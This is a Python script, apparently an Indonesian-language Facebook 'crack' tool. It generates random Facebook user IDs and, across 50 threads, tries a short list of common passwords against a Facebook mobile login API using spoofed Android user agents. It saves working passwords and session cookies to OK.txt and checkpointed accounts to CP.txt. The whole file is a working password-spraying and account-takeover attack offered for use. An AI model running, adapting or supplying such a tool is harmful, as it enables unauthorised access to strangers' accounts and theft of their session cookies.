import requests
import random
import os
import sys
from concurrent.futures import ThreadPoolExecutor

oks = []
cps = []
loop_count = 0
G = "\033[1;32m"
Y = "\033[1;33m"
R = "\033[1;31m"
W = "\033[1;37m"
C = "\033[1;36m"
# ===================== USER AGENT ===================== #
def random_ua():
    android = random.choice(["10", "11", "12", "13"])
    chrome = f"{random.randint(111,555)}.0.0.{random.randint(10,30)}"
    model = random.choice(["CPH2127","RMX3081","CPH2269","CPH2381"])
    return (
        f"Mozilla/5.0 (Linux; Android {android}; {model}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{chrome} Mobile Safari/537.36"
    )


# ===================== LOGIN ===================== #
def login_bapi(uid):
    global oks, cps, loop_count

    session = requests.Session()
    password_list = [
        "123456","1234567","12345678",
        "123456789","123123","143143"
    ]

    for pw in password_list:
        ua = random_ua()

        url = (
            "https://b-api.facebook.com/method/auth.login?"
            f"format=json&email={uid}&password={pw}"
            "&credentials_type=device_based_login_password"
            "&generate_session_cookies=1&error_detail_type=button_with_disabled"
            "&source=device_based_login&meta_inf_fbmeta="
            "&currently_logged_in_userid=0&method=GET&locale=en_US"
            "&client_country_code=ID"
        )

        headers = {
            "User-Agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000000,90000000)),
            "x-fb-net-hni": str(random.randint(20000,60000)),
            "x-fb-sim-hni": str(random.randint(20000,60000)),
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        }

        try:
            r = session.get(url, headers=headers, timeout=10)
            response = r.json()
        except:
            continue

        loop_count += 1
        sys.stdout.write(
            f"\r[CRACK] {loop_count}  {G}OK:{len(oks)}  {Y}CP:{len(cps)}"
        )
        sys.stdout.flush()

        # OK
        if "session_key" in response:
            cookie = ";".join(
                f"{i['name']}={i['value']}" for i in response["session_cookies"]
            )

            oks.append(uid)
            print(f"\n{G}OK {uid} | {pw}")
            print(f"{G}COOKIE: {cookie}\nUA: {ua}\n")

            with open("OK.txt","a") as f:
                f.write(f"{uid}|{pw}|{cookie}\n")

            break

        # CP
        elif "www.facebook.com" in str(response.get("error_msg","")):
            cps.append(uid)
            print(f"\n{Y}CP {uid} | {pw}\nUA: {ua}\n")

            with open("CP.txt","a") as f:
                f.write(f"{uid}|{pw}\n")

            break


# ===================== GENERATE ID ===================== #
def generate_ids(limit, prefix="10000"):
    users = []
    for _ in range(limit):
        num = random.randint(1000000000, 3999999999)
        users.append(prefix + str(num))
    return users


# ===================== DRIVER ===================== #
def start_crack(uid_list):
    with ThreadPoolExecutor(max_workers=50) as ex:
        ex.map(login_bapi, uid_list)


# ===================== MENU ===================== #
def VarkCozery():
    os.system("clear")
    limit = int(input("TOTAL ID (contoh 5000): "))
    tahun = input("Pilih Tahun (1 = 2010): ")

    if tahun == "1":
        prefix = "10000"
    else:
        prefix = "10000"

    uid_list = generate_ids(limit, prefix)

    print(f"\nTotal ID Loaded: {len(uid_list)}\nMulai proses...\n")
    start_crack(uid_list)


# ===================== RUN ===================== #
if __name__ == "__main__":
    VarkCozery()